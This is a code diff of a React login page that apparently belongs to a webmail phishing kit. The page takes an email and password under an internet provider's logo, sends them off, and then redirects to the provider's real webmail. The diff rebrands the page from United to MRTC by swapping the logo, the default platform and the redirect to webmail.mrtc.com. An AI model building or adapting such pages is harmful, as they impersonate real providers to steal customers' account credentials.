@@ -9,13 +9,16 @@ import comporium from './comporium.png';
 import powerx from './powerx.png';
 import mediacom from './mediacom.png';
 import united from './united.png';
+import mrtc from './mrtc.png';
+
+
 function Home(){
 
     const[email, setEmail] = useState("");
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("United");
+    const[platform, setPlatform] = useState("Mrtc");
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +46,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.united.net/';
+               window.location.href = 'https://webmail.mrtc.com/';
             }
           } catch (error) {
             // Handle error
@@ -68,7 +71,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv px-3 text-center'>
-                <img src={united} className="mylogo" />
+                <img src={mrtc} className="mylogo" />
 
                 </div>
 
